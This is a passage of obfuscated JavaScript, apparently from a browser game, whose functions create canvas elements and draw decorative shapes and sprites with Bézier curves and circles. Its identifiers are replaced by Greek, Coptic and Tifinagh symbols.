			ΔⲆ(Δ, Ⲇᐃ[4], Ⲇᐃ[ᐃᐃⲆᐃ], ⲆΔⲆᐃ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔⵠⲆⲆ];
			Δ.lineJoin = ⵠ[ⵠⵠΔⵠ];
			Δ.moveTo(189 * ᐃ, ᐃ * 43);
			Δ.bezierCurveTo(191 * ᐃ, ᐃ * 54, 196 * ᐃ, 58 * ᐃ, ᐃ * 205, ᐃ * 59);
			Δ.bezierCurveTo(211 * ᐃ, ᐃ * 42, ᐃ * 214, 37 * ᐃ, 216 * ᐃ, ᐃ * 31);
			Δ.bezierCurveTo(ᐃ * 202, ᐃ * 34, ᐃ * 195, ᐃ * 39, 190 * ᐃ, 43 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⵠⵠΔ], Ⲇᐃ[5], 5 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(216 * ᐃ, ᐃ * 98);
			Δ.bezierCurveTo(219 * ᐃ, 105 * ᐃ, 225 * ᐃ, ᐃ * 107, 230 * ᐃ, ᐃ * 109);
			Δ.bezierCurveTo(ᐃ * 227, 113 * ᐃ, ᐃ * 221, ᐃ * 115, ᐃ * 215, ᐃ * 115);
			Δ.bezierCurveTo(ᐃ * 208, ᐃ * 109, ᐃ * 211, 101 * ᐃ, ᐃ * 216, 98 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⲆᐃⲆⵠ], Ⲇᐃ[ⲆΔΔᐃ], ᐃ * ᐃΔΔⲆ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃⲆⵠΔ];
			Δ.moveTo(ᐃ * 180, 85 * ᐃ);
			Δ.bezierCurveTo(193 * ᐃ, 86 * ᐃ, 196 * ᐃ, ᐃ * 98, 191 * ᐃ, 108 * ᐃ);
			Δ.bezierCurveTo(179 * ᐃ, ᐃ * 112, ᐃ * 167, 113 * ᐃ, ᐃ * 155, ᐃ * 111);
			Δ.bezierCurveTo(169 * ᐃ, ᐃ * ΔᐃΔᐃΔ, ᐃ * 176, ᐃ * 96, ᐃ * 180, 85 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⵠΔᐃΔ], Ⲇᐃ[5], ᐃ * ᐃΔΔⲆ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆⲆΔⵠ];
			Δ.lineJoin = ⵠ[ⲆⲆΔⵠ];
			Δ.moveTo(ᐃ * 96, 114 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 102, 109 * ᐃ, ᐃ * 112, ᐃ * 110, 114 * ᐃ, 118 * ᐃ);
			Δ.bezierCurveTo(111 * ᐃ, ᐃ * 134, ᐃ * 102, ᐃ * 143, ᐃ * 95, ᐃ * 147);
			Δ.bezierCurveTo(98 * ᐃ, 123 * ᐃ, ᐃ * 97, 119 * ᐃ, ᐃ * 96, ᐃ * 115);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆᐃᐃΔ], Ⲇᐃ[ⲆΔΔᐃ], ΔΔᐃⲆ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃΔΔΔ];
			Δ.lineJoin = ⵠ[ᐃΔΔⲆ];
			Δ.moveTo(79 * ᐃ, 92 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 86, ᐃ * 95, 89 * ᐃ, 102 * ᐃ, 83 * ᐃ, 111 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 70, ᐃ * 110, 61 * ᐃ, ᐃ * 107, 54 * ᐃ, ⲆᐃⵠΔΔⲆⲆ * ᐃ);
			Δ.bezierCurveTo(70 * ᐃ, 97 * ᐃ, ᐃ * 70, 95 * ᐃ, 78 * ᐃ, ᐃ * 92);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆⵠᐃⲆ], Ⲇᐃ[5], ᐃ * 5);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔⲆΔΔ];
			Δ.lineJoin = ⵠ[ᐃΔΔⲆ];
			Δ.moveTo(39 * ᐃ, 130 * ᐃ);
			Δ.bezierCurveTo(37 * ᐃ, ᐃ * 141, 41 * ᐃ, ᐃ * 143, ᐃ * 48, ᐃ * 144);
			Δ.bezierCurveTo(54 * ᐃ, 134 * ᐃ, ᐃ * 55, 131 * ᐃ, 56 * ᐃ, 123 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 47, 129 * ᐃ, ᐃ * 43, ᐃ * 129, ᐃ * 39, ᐃ * 129);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⲆᐃⲆⵠ], Ⲇᐃ[5], 5 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 113, 189 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 119, ᐃ * 201, ᐃ * 127, ᐃ * 198, ᐃ * 134, 192 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 128, 175 * ᐃ, 128 * ᐃ, 173 * ᐃ, 128 * ᐃ, ᐃ * 165);
			Δ.bezierCurveTo(ᐃ * 117, 176 * ᐃ, 116 * ᐃ, 182 * ᐃ, ᐃ * 113, ᐃ * 187);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆΔⵠᐃ], Ⲇᐃ[5], ᐃ * 5);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃⲆⵠⵠ];
			Δ.lineJoin = ⵠ[ⲆΔⲆᐃ];
			Δ.moveTo(74 * ᐃ, 154 * ᐃ);
			Δ.bezierCurveTo(76 * ᐃ, 163 * ᐃ, ᐃ * 76, 170 * ᐃ, ᐃ * 75, 177 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 68, 179 * ᐃ, 66 * ᐃ, 176 * ᐃ, ᐃ * 63, 171 * ᐃ);
			Δ.bezierCurveTo(69 * ᐃ, ᐃ * 164, 72 * ᐃ, 159 * ᐃ, ᐃ * 74, ᐃ * 154);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[4], Ⲇᐃ[ⵠᐃΔⵠ], ᐃ * ⲆⲆΔⵠ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆⵠⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 206, 152 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 198, ᐃ * 158, 198 * ᐃ, ᐃ * 166, 201 * ᐃ, 171 * ᐃ);
			Δ.bezierCurveTo(209 * ᐃ, ᐃ * 170, 221 * ᐃ, 170 * ᐃ, ᐃ * 226, ᐃ * 172);
			Δ.bezierCurveTo(219 * ᐃ, 159 * ᐃ, ᐃ * 210, ᐃ * 155, ᐃ * 207, ᐃ * 153);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[4], Ⲇᐃ[ⲆΔΔᐃ], ᐃ * ⵠᐃΔⲆ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ΔᐃΔⲆ];
			Δ.moveTo(181 * ᐃ, 184 * ᐃ);
			Δ.bezierCurveTo(170 * ᐃ, 184 * ᐃ, ᐃ * 167, ᐃ * 187, ᐃ * 163, 195 * ᐃ);
			Δ.bezierCurveTo(171 * ᐃ, 207 * ᐃ, ᐃ * 183, ᐃ * 214, 191 * ᐃ, ᐃ * 217);
			Δ.bezierCurveTo(183 * ᐃ, 204 * ᐃ, 184 * ᐃ, ᐃ * 196, ᐃ * 181, ᐃ * 184);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[4], Ⲇᐃ[ᐃΔΔⲆ], ᐃ * 5);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(66 * ᐃ, 199 * ᐃ);
			Δ.bezierCurveTo(73 * ᐃ, ᐃ * 197, ᐃ * 78, ᐃ * 199, ᐃ * 79, 206 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 71, 216 * ᐃ, ᐃ * 67, ᐃ * 221, ᐃ * 57, ᐃ * 223);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠΔΔᐃΔ], Ⲇᐃ[ⲆΔⲆᐃ], 5 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃⲆⵠΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 182, 143 * ᐃ);
			Δ.bezierCurveTo(183 * ᐃ, 146 * ᐃ, ᐃ * 183, ᐃ * 149, 179 * ᐃ, 152 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 174, 146 * ᐃ, ᐃ * 174, 146 * ᐃ, 169 * ᐃ, ᐃ * 140);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[4], Ⲇᐃ[5], ⵠⵠΔΔ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃⲆⵠⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 32, 159 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 45, ᐃ * 160, 48 * ᐃ, 164 * ᐃ, 45 * ᐃ, 175 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 28, 183 * ᐃ, ᐃ * 25, ᐃ * 184, ᐃ * 19, 184 * ᐃ);
			Δ.bezierCurveTo(30 * ᐃ, ᐃ * 170, 29 * ᐃ, ᐃ * 164, 31 * ᐃ, ᐃ * 160);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[4], Ⲇᐃ[ᐃΔΔΔ], ᐃ * ⵠⵠᐃⵠ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃⲆⵠⵠ];
			Δ.lineJoin = ⵠ[ΔΔᐃⲆ];
			Δ.moveTo(110 * ᐃ, ᐃ * 214);
			Δ.bezierCurveTo(106 * ᐃ, 212 * ᐃ, ᐃ * 104, 213 * ᐃ, ᐃ * 102, 218 * ᐃ);
			Δ.bezierCurveTo(104 * ᐃ, ᐃ * 220, ᐃ * 107, 222 * ᐃ, ᐃ * 110, ᐃ * 224);
			Δ.bezierCurveTo(ᐃ * 110.5, ᐃ * 219, ᐃ * 110.5, ᐃ * 219, ᐃ * 111, 214 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[4], Ⲇᐃ[ⲆΔⲆᐃ], ᐃ * 5);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃΔΔⲆ];
			Δ.moveTo(40 * ᐃ, 52 * ᐃ);
			Δ.bezierCurveTo(41 * ᐃ, ᐃ * 57, 40 * ᐃ, 61 * ᐃ, 34 * ᐃ, 60 * ᐃ);
			Δ.bezierCurveTo(31.5 * ᐃ, ᐃ * 55, 31.5 * ᐃ, 55 * ᐃ, ᐃ * 29, 50 * ᐃ);
			Δ.bezierCurveTo(34 * ᐃ, 50.5 * ᐃ, 34 * ᐃ, ᐃ * 50.5, 39 * ᐃ, ᐃ * 51);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆΔⵠᐃ], Ⲇᐃ[5], ΔⵠⲆⲆ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠⵠΔⵠ];
			Δ.moveTo(31 * ᐃ, ᐃ * 81);
			Δ.bezierCurveTo(ᐃ * 37, 84 * ᐃ, ᐃ * 38, 90 * ᐃ, ᐃ * 34, ᐃ * 99);
			Δ.bezierCurveTo(23 * ᐃ, 97 * ᐃ, ᐃ * ⲆⲆΔᐃΔΔⵠ, 96 * ᐃ, 16 * ᐃ, 93 * ᐃ);
			Δ.bezierCurveTo(24 * ᐃ, 88 * ᐃ, ᐃ * 28, 85 * ᐃ, ᐃ * 30, 81 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[4], Ⲇᐃ[ᐃᐃⲆᐃ], ᐃ * ⵠᐃΔⲆ);
			return Ⲇⵠ
		}

		function ΔⵠΔⲆΔΔⲆ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 400 * ᐃ;
			Ⲇⵠ.height = 400 * ᐃ;
			Δ.globalAlpha = ⲆⵠⲆⲆ;
			Δ.translate(ᐃ * ⵠⲆⲆⲆⲆ, 20 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃᐃⲆᐃ];
			Δ.lineJoin = ⵠ[ΔⲆΔΔ];
			Δ.moveTo(36.5 * ᐃ, 278.0625 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 67.5, 316.0625 * ᐃ, ᐃ * 134.5, 334.0625 * ᐃ, ᐃ * 199.5, 319.0625 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 254.5, ᐃ * 304.0625, ᐃ * 346.5, 270.0625 * ᐃ, 348.5 * ᐃ, ᐃ * 237.0625);
			Δ.bezierCurveTo(ᐃ * 359.5, 206.0625 * ᐃ, ᐃ * 318.5, 129.0625 * ᐃ, ᐃ * 262.5, ᐃ * 122.0625);
			Δ.bezierCurveTo(213.5 * ᐃ, ᐃ * 115.0625, 166.5 * ᐃ, 133.0625 * ᐃ, ᐃ * 104.5, 166.0625 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 54.5, 194.0625 * ᐃ, 23.5 * ᐃ, ᐃ * 241.0625, 36.5 * ᐃ, ᐃ * 277.0625);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⲆᐃⵠ]);
			Δ.translate(ᐃ * -ΔΔⲆⵠᐃ, ᐃ * -20);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠᐃⵠ];
			Δ.lineJoin = ⵠ[ᐃⲆⵠΔ];
			Δ.moveTo(36.5 * ᐃ, ᐃ * 278.0625);
			Δ.bezierCurveTo(67.5 * ᐃ, 316.0625 * ᐃ, ᐃ * 134.5, ᐃ * 334.0625, 199.5 * ᐃ, 319.0625 * ᐃ);
			Δ.bezierCurveTo(254.5 * ᐃ, 304.0625 * ᐃ, 346.5 * ᐃ, ᐃ * 270.0625, ᐃ * 348.5, ᐃ * 237.0625);
			Δ.bezierCurveTo(359.5 * ᐃ, 206.0625 * ᐃ, ᐃ * 318.5, 129.0625 * ᐃ, ᐃ * 262.5, ᐃ * 122.0625);
			Δ.bezierCurveTo(ᐃ * 213.5, 115.0625 * ᐃ, ᐃ * 166.5, 133.0625 * ᐃ, ᐃ * 104.5, ᐃ * 166.0625);
			Δ.bezierCurveTo(ᐃ * 54.5, 194.0625 * ᐃ, 23.5 * ᐃ, 241.0625 * ᐃ, 36.5 * ᐃ, 277.0625 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃᐃⵠ], Ⲇᐃ[2], 19 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠⵠΔΔ];
			Δ.moveTo(214.5 * ᐃ, ᐃ * 124.0625);
			Δ.bezierCurveTo(242.5 * ᐃ, 125.0625 * ᐃ, 272.5 * ᐃ, 159.0625 * ᐃ, ᐃ * 283.5, ᐃ * 184.0625);
			Δ.bezierCurveTo(ᐃ * 277.5, 161.0625 * ᐃ, ᐃ * 233.5, ᐃ * 128.0625, ᐃ * 219.5, ᐃ * 122.0625);
			Δ.closePath();
			ΔⲆ(Δ, undefined, Ⲇᐃ[Δⵠⵠⵠ], ᐃ * 19);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔⵠⲆⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(157.5 * ᐃ, 145.0625 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 176.5, 148.0625 * ᐃ, ᐃ * 205.5, ᐃ * 176.0625, 212.5 * ᐃ, 197.0625 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 205.5, 178.0625 * ᐃ, 177.5 * ᐃ, ᐃ * 152.0625, ᐃ * 156.5, 142.0625 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, ΔΔΔⲆΔ, Ⲇᐃ[ΔⲆΔΔΔ], ᐃ * 19);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠᐃⲆΔ];
			Δ.moveTo(ᐃ * 103.5, 169.0625 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 160.5, ᐃ * 166.0625, 228.5 * ᐃ, 312.0625 * ᐃ, ᐃ * 162.5, 323.0625 * ᐃ);
			Δ.bezierCurveTo(128.5 * ᐃ, ᐃ * 330.0625, ᐃ * 45.5, ᐃ * 312.0625, ᐃ * 34.5, ᐃ * 268.0625);
			Δ.bezierCurveTo(ᐃ * 30.5, ᐃ * 238.0625, ᐃ * 44.5, ᐃ * 222.0625, 52.5 * ᐃ, 211.0625 * ᐃ);
			Δ.bezierCurveTo(82.5 * ᐃ, ᐃ * 174.0625, ᐃ * 104.5, ᐃ * 166.0625, ᐃ * 119.5, ᐃ * 172.0625);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[2], 19 * ᐃ);
			ⵠᐃᐃ(Δ, 92.5 * ᐃ, ᐃ * 216.0625, 13.892443989449804 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[4]);
			ⵠᐃᐃ(Δ, 68.5 * ᐃ, 227.0625 * ᐃ, ᐃ * 8.06225774829855);
			ΔⲆ(Δ, Ⲇᐃ[4]);
			ⵠᐃᐃ(Δ, ᐃ * 85.5, ᐃ * 240.0625, 6.708203932499369 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[4]);
			ⵠᐃᐃ(Δ, 147.5 * ᐃ, ᐃ * 294.0625, ᐃ * 17.46424919657298);
			ΔⲆ(Δ, Ⲇᐃ[4]);
			ⵠᐃᐃ(Δ, ᐃ * 166.5, 273.0625 * ᐃ, 6.708203932499369 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆⲆⲆ]);
			ⵠᐃᐃ(Δ, 114.5 * ᐃ, ᐃ * 294.0625, ᐃ * 12.36931687685298);
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆᐃⵠᐃ]);
			ⵠᐃᐃ(Δ, 123.5 * ᐃ, 220.0625 * ᐃ, ᐃ * 5.830951894845301);
			ΔⲆ(Δ, Ⲇᐃ[4]);
			ⵠᐃᐃ(Δ, 114.5 * ᐃ, 259.0625 * ᐃ, ᐃ * 4.123105625617661);
			ΔⲆ(Δ, Ⲇᐃ[4]);
			ⵠᐃᐃ(Δ, ᐃ * 63.5, 265.0625 * ᐃ, ᐃ * 5.385164807134504);
			ΔⲆ(Δ, Ⲇᐃ[ⵠᐃᐃⲆ]);
			ⵠᐃᐃ(Δ, ᐃ * 148.5, 235.0625 * ᐃ, ᐃ * 4.47213595499958);
			ΔⲆ(Δ, Ⲇᐃ[4]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(194.5 * ᐃ, 313.0625 * ᐃ);
			Δ.bezierCurveTo(222.5 * ᐃ, ᐃ * 306.0625, ᐃ * 319.5, ᐃ * 271.0625, 337.5 * ᐃ, ᐃ * 241.0625);
			Δ.bezierCurveTo(274.5 * ᐃ, 270.0625 * ᐃ, 216.5 * ᐃ, 288.0625 * ᐃ, 199.5 * ᐃ, ᐃ * 287.0625);
			Δ.bezierCurveTo(198.5 * ᐃ, 302.0625 * ᐃ, 195.5 * ᐃ, ᐃ * 311.0625, 193.5 * ᐃ, 312.0625 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⵠΔΔ]);
			return Ⲇⵠ
		}

		function ⵠᐃⵠⲆⲆΔⵠᐃⲆ(ᐃ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 376 * ᐃ;
			Ⲇⵠ.height = ᐃ * 371;
			Δ.globalAlpha = 1;
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⲆⲆΔⵠ];
			Δ.moveTo(191.633544921875 * ᐃ, 123.98580932617188 * ᐃ);
			Δ.bezierCurveTo(215.633544921875 * ᐃ, ᐃ * 85.98580932617188, ᐃ * 187.633544921875, 71.98580932617188 * ᐃ, ᐃ * 202.633544921875, 19.985809326171875 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 231.633544921875, 68.98580932617188 * ᐃ, 253.633544921875 * ᐃ, 71.98580932617188 * ᐃ, 256.633544921875 * ᐃ, ᐃ * 93.98580932617188);
			Δ.bezierCurveTo(306.633544921875 * ᐃ, 64.98580932617188 * ᐃ, 319.633544921875 * ᐃ, 61.985809326171875 * ᐃ, 350.633544921875 * ᐃ, 58.985809326171875 * ᐃ);
			Δ.bezierCurveTo(280.633544921875 * ᐃ, ᐃ * 86.98580932617188, 281.633544921875 * ᐃ, 106.98580932617188 * ᐃ, 268.633544921875 * ᐃ, ᐃ * 130.98580932617188);
			Δ.bezierCurveTo(295.633544921875 * ᐃ, 158.98580932617188 * ᐃ, ᐃ * 328.633544921875, 155.98580932617188 * ᐃ, 353.633544921875 * ᐃ, 90.98580932617188 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 371.633544921875, ᐃ * 158.98580932617188, ᐃ * 337.633544921875, ᐃ * 210.98580932617188, ᐃ * 286.633544921875, ᐃ * 209.98580932617188);
			Δ.bezierCurveTo(323.633544921875 * ᐃ, ᐃ * 230.98580932617188, ᐃ * 317.633544921875, 274.9858093261719 * ᐃ, ᐃ * 356.633544921875, 305.9858093261719 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 288.633544921875, 297.9858093261719 * ᐃ, 288.633544921875 * ᐃ, 265.9858093261719 * ᐃ, 275.633544921875 * ᐃ, ᐃ * 266.9858093261719);
			Δ.bezierCurveTo(ᐃ * 280.633544921875, ᐃ * 294.9858093261719, ᐃ * 315.633544921875, 306.9858093261719 * ᐃ, ᐃ * 336.633544921875, ᐃ * 316.9858093261719);
			Δ.bezierCurveTo(295.633544921875 * ᐃ, 318.9858093261719 * ᐃ, ᐃ * 264.633544921875, 302.9858093261719 * ᐃ, 254.633544921875 * ᐃ, ᐃ * 289.9858093261719);
			Δ.bezierCurveTo(252.633544921875 * ᐃ, ᐃ * 301.9858093261719, 224.633544921875 * ᐃ, ᐃ * 315.9858093261719, ᐃ * 201.633544921875, ᐃ * 356.9858093261719);
			Δ.bezierCurveTo(195.633544921875 * ᐃ, ᐃ * 313.9858093261719, 195.633544921875 * ᐃ, ᐃ * 308.9858093261719, ᐃ * 196.633544921875, ᐃ * 307.9858093261719);
			Δ.bezierCurveTo(197.633544921875 * ᐃ, ᐃ * 289.9858093261719, ᐃ * 207.633544921875, ᐃ * 283.9858093261719, 195.633544921875 * ᐃ, 258.9858093261719 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 182.633544921875, 282.9858093261719 * ᐃ, 190.633544921875 * ᐃ, 287.9858093261719 * ᐃ, ᐃ * 193.633544921875, 297.9858093261719 * ᐃ);
			Δ.bezierCurveTo(195.633544921875 * ᐃ, 306.9858093261719 * ᐃ, 191.633544921875 * ᐃ, ᐃ * 334.9858093261719, 187.633544921875 * ᐃ, 354.9858093261719 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 165.633544921875, 320.9858093261719 * ᐃ, ᐃ * 138.633544921875, 307.9858093261719 * ᐃ, ᐃ * 135.633544921875, 288.9858093261719 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 110.633544921875, 318.9858093261719 * ᐃ, 68.633544921875 * ᐃ, 323.9858093261719 * ᐃ, 49.633544921875 * ᐃ, 320.9858093261719 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 88.633544921875, ᐃ * 308.9858093261719, 108.633544921875 * ᐃ, 284.9858093261719 * ᐃ, ᐃ * 118.633544921875, ᐃ * 258.9858093261719);
			Δ.bezierCurveTo(86.633544921875 * ᐃ, 264.9858093261719 * ᐃ, 75.633544921875 * ᐃ, 310.9858093261719 * ᐃ, 19.633544921875 * ᐃ, 304.9858093261719 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 54.633544921875, ᐃ * 276.9858093261719, ᐃ * 59.633544921875, ᐃ * 214.98580932617188, ᐃ * 105.633544921875, 205.98580932617188 * ᐃ);
			Δ.bezierCurveTo(14.633544921875 * ᐃ, ᐃ * 201.98580932617188, ᐃ * 24.633544921875, 141.98580932617188 * ᐃ, ᐃ * 25.633544921875, ᐃ * 82.98580932617188);
			Δ.bezierCurveTo(ᐃ * 49.633544921875, 168.98580932617188 * ᐃ, 87.633544921875 * ᐃ, 141.98580932617188 * ᐃ, ᐃ * 112.633544921875, ᐃ * 123.98580932617188);
			Δ.bezierCurveTo(ᐃ * 95.633544921875, 75.98580932617188 * ᐃ, 70.633544921875 * ᐃ, ᐃ * 68.98580932617188, ᐃ * 35.633544921875, ᐃ * 50.985809326171875);
			Δ.bezierCurveTo(ᐃ * 70.633544921875, ᐃ * 53.985809326171875, ᐃ * 102.633544921875, ᐃ * 65.98580932617188, ᐃ * 125.633544921875, 84.98580932617188 * ᐃ);
			Δ.bezierCurveTo(133.633544921875 * ᐃ, ᐃ * 69.98580932617188, 166.633544921875 * ᐃ, 42.985809326171875 * ᐃ, 176.633544921875 * ᐃ, 21.985809326171875 * ᐃ);
			Δ.bezierCurveTo(185.633544921875 * ᐃ, 49.985809326171875 * ᐃ, ᐃ * 168.633544921875, ᐃ * 95.98580932617188, 191.633544921875 * ᐃ, 121.98580932617188 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆⵠⲆ], Ⲇᐃ[0], ⲆΔⵠᐃⲆ * ᐃ);
			return Ⲇⵠ
		}

		function ⵠᐃΔᐃⵠⵠΔ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 440 * ᐃ;
			Ⲇⵠ.height = ᐃ * 388;
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : ΔᐃᐃⲆ;
			Δ.translate(ⵠᐃΔⵠ * ᐃ, ᐃ * 5);
			ⵠᐃᐃ(Δ, ᐃ * 220, ᐃ * 201, 170.41713528867922 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[0], ᐃ * ⲆΔᐃΔⵠ);
			Δ.globalAlpha = 1;
			Δ.translate(ᐃ * -5, ᐃ * -ᐃΔΔⲆ);
			ⵠᐃᐃ(Δ, ᐃ * 220, 201 * ᐃ, ᐃ * 170.41713528867922);
			ΔⲆ(Δ, Ⲇᐃ[ΔᐃⲆⵠ], Ⲇᐃ[2], ⵠᐃΔⵠᐃ * ᐃ);
			ⵠᐃᐃ(Δ, ᐃ * 220, 201 * ᐃ, 130 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[11], Ⲇᐃ[2], 6 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(218 * ᐃ, ᐃ * 97);
			Δ.bezierCurveTo(219 * ᐃ, ᐃ * 163, ᐃ * 201, 176 * ᐃ, 191 * ᐃ, ᐃ * 175);
			Δ.bezierCurveTo(176 * ᐃ, 177 * ᐃ, 168 * ᐃ, ᐃ * 167, ᐃ * 160, 115 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[5], Ⲇᐃ[ᐃⵠⵠⲆⵠ], 4 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔⲆΔΔ];
			Δ.lineJoin = ⵠ[ⵠⵠΔΔ];
			Δ.moveTo(224 * ᐃ, ᐃ * 181);
			Δ.bezierCurveTo(225 * ᐃ, ᐃ * 138, ᐃ * 246, 115 * ᐃ, ᐃ * 263, 137 * ᐃ);
			Δ.bezierCurveTo(282 * ᐃ, ᐃ * 174, ᐃ * 279, 217 * ᐃ, 265 * ᐃ, 243 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 253, 264 * ᐃ, ᐃ * 240, ᐃ * 256, ᐃ * 233, 238 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 221, 212 * ᐃ, ᐃ * 225, ᐃ * 198, 224 * ᐃ, ᐃ * 184);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠᐃΔⵠ], Ⲇᐃ[ΔᐃⲆᐃ], ᐃ * 4);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃΔⲆ];
			Δ.lineJoin = ⵠ[ΔᐃΔⲆ];
			Δ.moveTo(169 * ᐃ, ᐃ * 289);
			Δ.bezierCurveTo(ᐃ * 161, ᐃ * 234, 168 * ᐃ, ᐃ * 197, ᐃ * 187, 195 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 219, 189 * ᐃ, 222 * ᐃ, ⲆΔᐃΔⵠⵠⲆ * ᐃ, 216 * ᐃ, 307 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[5], Ⲇᐃ[6], 4 * ᐃ);
			Δ.beginPath();
